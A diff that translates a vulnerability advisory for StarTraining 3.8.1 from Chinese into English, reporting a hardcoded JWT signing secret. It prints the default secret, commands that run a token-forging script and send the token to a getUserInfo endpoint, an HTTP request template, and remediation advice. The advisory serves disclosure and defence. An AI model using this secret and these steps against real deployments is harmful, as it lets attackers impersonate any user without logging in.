@@ -1,42 +1,42 @@
-# StarTraining — JWT 硬编码密钥可伪造身份令牌 (ST-VULN-001)
+# StarTraining — Hardcoded JWT secret allows forged identity tokens (ST-VULN-001)
 
-| 项 | 内容 |
-|----|------|
+| Field | Value |
+|-------|-------|
 | Vendor | zhistaredu |
-| Product | StarTraining（职星学院） |
+| Product | StarTraining |
 | Version | 3.8.1 |
 | Type | Use of Hard-coded Password |
 | CWE | CWE-798 / CWE-287 |
-| 认证 | None (offline forge with default secret) |
-| 严重度 | Critical |
+| Authentication | None (offline forge with default secret) |
+| Severity | Critical |
 
-## 说明
+## Summary
 
-配置里 token.secret 写死成 abcdefghijklmnopqrstuvwxyz。JWT 用 HS512 签，没有 exp。密钥没改的话，谁都能本地伪造任意 user_id / company_id 的 token。
+`application.yml` sets `token.secret` to a fixed 26-char string. `UserLoginService.createToken()` signs HS512 JWT without `exp`. Attacker can forge tokens for arbitrary `user_id` / `company_id`.
 
-## 根因
+## Root cause
 
-密钥写死在 application.yml；createToken 不带过期；parseToken 还会把 secret 和 token 打到 stdout。
+Hardcoded JWT secret; no expiration claim; token printed in logs during parse.
 
-## 利用链接 / 复现
+## Exploit / reproduction
 
-本地默认密钥：`abcdefghijklmnopqrstuvwxyz`（`application.yml` → `token.secret`）。
+Default secret: `abcdefghijklmnopqrstuvwxyz` (`application.yml` → `token.secret`).
 
 ```bash
 cd poc_verify
 python3 startraining_jwt_forge.py --user-id fa36ec75-160a-47e4-8140-ef1e94c5d329 --company-id 5d70aa10-b5af-4092-b968-d374dd133269
-# 把输出的 JWT 塞进 Authorization（不要加 Bearer）
+# Put the JWT in Authorization (no Bearer prefix)
 
 curl -s 'http://127.0.0.1:8900/system/user/getUserInfo' \
   -H "Authorization: $(python3 startraining_jwt_forge.py)"
 ```
 
-直链（需先伪造 token，不能裸点）：
+Endpoint (requires forged token):
 
 - `http://127.0.0.1:8900/system/user/getUserInfo`
 
 
-## 请求包（Yakit）
+## PoC (Yakit)
 
 ```http
 # Forge: python poc_verify/startraining_jwt_forge.py
@@ -46,21 +46,21 @@ Authorization: FORGED_JWT_HERE
 Connection: close
 ```
 
-期望：Authorization 带伪造 JWT 调 getUserInfo，返回 code=200。
+Expected: HTTP 200 with user profile when forged token carries valid user_id + company_id
 
-## 截图
+## Screenshots
 
 ![jwt-forge](./screenshots/ST-VULN-001-jwt-forge.png)
 
-## 影响
+## Impact
 
-未登录也能冒充任意用户打业务接口。
+Full API access as any user when secret is unchanged.
 
-## 修复
+## Remediation
 
-密钥改成环境变量并轮换；补 exp/iat；删掉调试打印。
+Rotate secret via env; add exp/iat claims; remove debug println of secret/token.
 
-## 关联
+## References
 
-- 本地报告：`../POC_VERIFICATION_REPORT.md`
-- 脚本：`poc_verify/startraining_poc_verify.py` / `startraining_jwt_forge.py`
+- Local report: `../POC_VERIFICATION_REPORT.md`
+- Scripts: `poc_verify/startraining_poc_verify.py`, `startraining_jwt_forge.py`
